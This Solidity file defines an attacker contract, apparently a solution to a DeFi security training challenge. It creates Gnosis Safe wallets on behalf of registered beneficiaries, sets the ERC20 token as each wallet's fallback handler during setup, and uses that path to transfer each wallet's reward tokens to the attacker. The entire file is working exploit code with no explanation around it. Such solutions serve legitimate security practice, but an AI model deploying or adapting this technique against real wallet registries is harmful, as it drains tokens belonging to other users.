// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {WalletRegistry} from "../WalletRegistry.sol";
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";

interface IGnosisSafeProxyFactory {
    function proxyRuntimeCode() external pure returns (bytes memory);

    function proxyCreationCode() external pure returns (bytes memory);

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);

    function calculateCreateProxyWithNonceAddress(address _singleton, bytes calldata initializer, uint256 saltNonce)
        external
        returns (GnosisSafeProxy proxy);
}

contract AttackerContract is Ownable {
    constructor(
        WalletRegistry registryAddress,
        address masterCopyAddress,
        address _gnosisSafeProxyFactory,
        IERC20 token,
        address[] memory victims
    ) {
        // Create a wallet for each beneficiary.
        GnosisSafeProxy wallet;
        for (uint256 i = 0; i < victims.length; i++) {
            address beneficiary = victims[i];
            address[] memory owners = new address[](1);
            owners[0] = beneficiary;

            wallet = IGnosisSafeProxyFactory(_gnosisSafeProxyFactory).createProxyWithCallback(
                masterCopyAddress,
                abi.encodeWithSelector(
                    GnosisSafe.setup.selector,
                    owners,
                    1,
                    address(0x0),
                    0x0,
                    address(token),
                    address(0x0),
                    0,
                    address(0x0)
                ),
                0,
                registryAddress
            );

            IERC20(address(wallet)).transfer(owner(), 10e18);
        }
    }

    receive() external payable {}
}
